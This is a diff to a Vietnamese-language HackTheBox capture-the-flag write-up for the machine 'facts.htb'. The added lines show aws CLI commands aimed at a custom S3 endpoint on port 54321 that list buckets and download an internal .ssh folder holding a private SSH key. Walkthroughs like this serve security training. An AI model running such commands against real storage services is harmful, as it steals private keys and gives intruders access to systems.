@@ -38,7 +38,26 @@ Xem xét trang quản trị, ta biết có một dịch vụ lưu trữ AWS trê
 
 ![](Attachments/Pasted%20image%2020260505191031.png)
 
+Cấu hình aws:
 
+![](Attachments/Pasted%20image%2020260505192607.png)
+
+`aws s3 ls s3://facts.htb/` -> Lệnh này sẽ hướng lên server của Amazon, thêm option --endpoint-url để hướng về smáy có port 54321.
+`aws s3 ls --endpoint-url http://facts.htb:54321`
+`aws s3 cp s3://ten-bucket/file.txt ./ --endpoint-url http://facts.htb:54321`
+
+![](Attachments/Pasted%20image%2020260505192916.png)
+
+Trong thư mục internal, ta sẽ phát hiện được 2 file ssh: `authorized_keys` và `id_ed25519` (khoá bí mật ssh).
+
+![](Attachments/Pasted%20image%2020260505193119.png)
+
+Tạo một thư mục để lưu trữ:
+`mkdir ssh_keys`
+Kéo dữ liệu về
+`aws s3 sync s3://internal/.ssh/ ./ssh_keys/ --endpoint-url http://facts.htb:54321`
+
+Vấn đề với ssh: 
 
 ![](Attachments/Pasted%20image%2020260505170126.png)
 
